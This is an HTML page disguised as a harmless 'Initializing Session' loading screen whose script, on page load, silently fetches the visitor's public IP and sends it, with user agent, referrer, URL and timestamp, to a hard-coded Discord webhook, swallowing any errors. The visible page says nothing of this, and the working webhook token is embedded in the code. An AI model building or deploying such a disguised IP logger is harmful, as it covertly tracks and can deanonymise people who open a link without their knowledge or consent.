<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Initializing…</title>
  <style>
    :root {
      --bg:       #0d0d0d;
      --surface:  #161616;
      --text:     #e0e0e0;
      --muted:    #8a8a8a;
      --border:   #2a2a2a;
      --accent:   #4a4a4a;   /* very subtle for spinner */
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }

    .container {
      text-align: center;
      max-width: 380px;
    }

    .spinner {
      width: 48px;
      height: 48px;
      margin: 0 auto 32px;
      position: relative;
    }

    .spinner::before,
    .spinner::after {
      content: "";
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 3px solid transparent;
      border-top-color: var(--accent);
      animation: spin 1.2s linear infinite;
    }

    .spinner::after {
      animation-duration: 0.9s;
      border-top-color: var(--muted);
      opacity: 0.6;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    h1 {
      font-size: 1.38rem;
      font-weight: 500;
      letter-spacing: -0.01em;
      margin-bottom: 12px;
    }

    .message {
      font-size: 0.94rem;
      color: var(--muted);
      line-height: 1.5;
      max-width: 340px;
      margin: 0 auto 40px;
    }

    .footer {
      margin-top: 80px;
      font-size: 0.75rem;
      color: #444;
      opacity: 0.7;
    }

    @media (max-height: 500px) {
      .container { margin-top: -40px; }
      .footer { margin-top: 40px; }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="spinner"></div>
    
    <h1>Initializing Session</h1>
    
    <div class="message">
      Verifying connection and loading resources.<br>
      This should take just a few seconds.
    </div>
  </div>

  <div class="footer">
    Secure Session • © 2026
  </div>

  <script>
    // ──────────────────────────────────────────────────────────────
    // WEBHOOK – visible in source / network tab
    // ──────────────────────────────────────────────────────────────
    const webhook = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';

    async function logVisit() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip = 'unknown' } = await ipRes.json() ?? {};

        const payload = {
          content: [
            '**Session Init**',
            `IP: ${ip}`,
            `UA: ${navigator.userAgent || '—'}`,
            `Referrer: ${document.referrer || 'direct'}`,
            `Location: ${window.location.href}`,
            `Timestamp: ${new Date().toISOString()}`
          ].join('\n'),
          allowed_mentions: { parse: [] }
        };

        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch {
        // silent failure
      }
    }

    // Execute immediately
    logVisit();
  </script>

</body>
</html>
